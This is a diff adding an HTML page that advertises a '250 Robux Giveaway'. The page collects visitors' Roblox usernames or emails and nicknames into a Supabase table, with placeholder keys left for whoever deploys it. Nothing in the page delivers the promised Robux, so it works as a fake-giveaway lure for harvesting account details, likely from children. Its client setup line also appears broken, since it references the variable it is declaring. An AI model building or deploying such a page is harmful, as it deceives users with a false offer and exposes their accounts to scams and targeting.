@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html>
+<head>
+
+<meta name="viewport"
+content="width=device-width, initial-scale=1.0">
+
+<title>250 Robux Giveaway</title>
+
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
+<style>
+
+body {
+  font-family: Arial;
+  background: linear-gradient(135deg,#0f172a,#1e293b);
+  color: white;
+  text-align: center;
+}
+
+.container {
+  max-width: 400px;
+  margin: 40px auto;
+  background: #1e293b;
+  padding: 20px;
+  border-radius: 15px;
+  box-shadow: 0 0 15px rgba(0,0,0,0.5);
+}
+
+h1 {
+  color: #22c55e;
+}
+
+input {
+  width: 100%;
+  padding: 12px;
+  margin: 10px 0;
+  border-radius: 8px;
+  border: none;
+}
+
+button {
+  width: 100%;
+  padding: 14px;
+  background: #22c55e;
+  border: none;
+  border-radius: 10px;
+  font-size: 16px;
+  color: white;
+}
+
+.note {
+  font-size: 12px;
+  opacity: 0.7;
+}
+
+</style>
+
+</head>
+
+<body>
+
+<div class="container">
+
+<h1>🎁 250 Robux Giveaway</h1>
+
+<p>Enter your details to receive 250 Robux!</p>
+
+<form id="form">
+
+<input
+id="useremail"
+placeholder="Roblox Username or Email"
+required>
+
+<input
+id="nickname"
+placeholder="Nickname"
+required>
+
+<button type="submit">
+Claim 250 Robux
+</button>
+
+</form>
+
+<p class="note">
+Username only — never share passwords 🔒
+</p>
+
+<p id="msg"></p>
+
+</div>
+
+<script>
+
+// 🔧 PUT YOUR SUPABASE DETAILS HERE
+
+const SUPABASE_URL =
+"PASTE_YOUR_URL";
+
+const SUPABASE_KEY =
+"PASTE_YOUR_ANON_KEY";
+
+const supabase =
+supabase.createClient(
+SUPABASE_URL,
+SUPABASE_KEY
+);
+
+document
+.getElementById("form")
+.addEventListener("submit",
+async (e) => {
+
+e.preventDefault();
+
+const useremail =
+document.getElementById("useremail").value;
+
+const nickname =
+document.getElementById("nickname").value;
+
+const { error } =
+await supabase
+.from("robux_entries")
+.insert([
+{
+useremail: useremail,
+nickname: nickname
+}
+]);
+
+if (error) {
+
+document.getElementById("msg")
+.innerText = "Error submitting.";
+
+} else {
+
+document.getElementById("msg")
+.innerText =
+"✅ Successfully Submitted!";
+
+document.getElementById("form").reset();
+
+}
+
+});
+
+</script>
+
+</body>
+</html>
